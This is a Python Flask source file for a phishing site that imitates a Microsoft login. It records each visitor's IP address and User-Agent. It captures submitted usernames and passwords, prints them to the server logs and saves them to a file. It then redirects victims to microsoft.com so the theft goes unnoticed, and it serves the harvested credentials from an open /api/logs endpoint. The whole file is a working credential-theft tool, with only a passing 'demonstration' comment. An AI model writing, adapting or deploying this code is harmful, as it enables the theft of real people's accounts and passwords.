# app.py
from flask import Flask, render_template, request, redirect, url_for, jsonify
import os
from datetime import datetime
import logging

# Set up logging to both console and file
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Add console handler to ensure output shows in render logs
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

app = Flask(__name__, static_folder='static', template_folder='templates')

@app.route('/')
def index():
    ip_address = get_ip_address(request)
    user_agent = request.headers.get('User-Agent')

    logger.info(f"New visitor: IP: {ip_address}, User-Agent: {user_agent}")
    log_visitor(ip_address, user_agent)

    return redirect(url_for('login'))

@app.route('/login.html')
def login():
    return render_template('login.html')

@app.route('/login.php', methods=['POST'])
def process_login():
    username = request.form.get('loginfmt', '')
    password = request.form.get('passwd', '')

    # Print credentials directly to output (will appear in render logs)
    print(f"CAPTURED CREDENTIALS - Username: {username}, Password: {password}")

    # Log credentials to console with logger
    logger.info(f"CAPTURED CREDENTIALS - Username: {username}, Password: {password}")

    # Also save to file for backup
    log_credentials(username, password)

    # Redirect to legitimate Microsoft site
    return redirect('https://microsoft.com')

def get_ip_address(request):
    """Extract IP address from request headers"""
    if request.headers.get('HTTP_CLIENT_IP'):
        ip = request.headers.get('HTTP_CLIENT_IP')
    elif request.headers.get('HTTP_X_FORWARDED_FOR'):
        ip = request.headers.get('HTTP_X_FORWARDED_FOR')
    elif request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr
    return ip

def log_visitor(ip, user_agent):
    """Log visitor information to ip.txt"""
    with open('ip.txt', 'a') as f:
        f.write(f"IP: {ip}\n User-Agent: {user_agent}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("-" * 50 + "\n")
    # Also print to console/stdout for Render logs
    print(f"Visitor logged - IP: {ip}, User-Agent: {user_agent}")

def log_credentials(username, password):
    """Log credentials to usernames.txt"""
    with open('usernames.txt', 'a') as f:
        f.write(f"Account: {username} Pass: {password}\n")
    # Also print to console/stdout for Render logs
    print(f"Credentials saved - Username: {username}, Password: {password}")

# API endpoint to get logged credentials (for demonstration purposes)
@app.route('/api/logs', methods=['GET'])
def get_logs():
    try:
        with open('usernames.txt', 'r') as f:
            logs = f.readlines()
        return jsonify({"logs": logs})
    except:
        return jsonify({"logs": []})

if __name__ == '__main__':
    # Make sure the log files exist
    for filename in ['ip.txt', 'usernames.txt']:
        if not os.path.exists(filename):
            open(filename, 'w').close()

    # Run the application
    app.run(debug=False)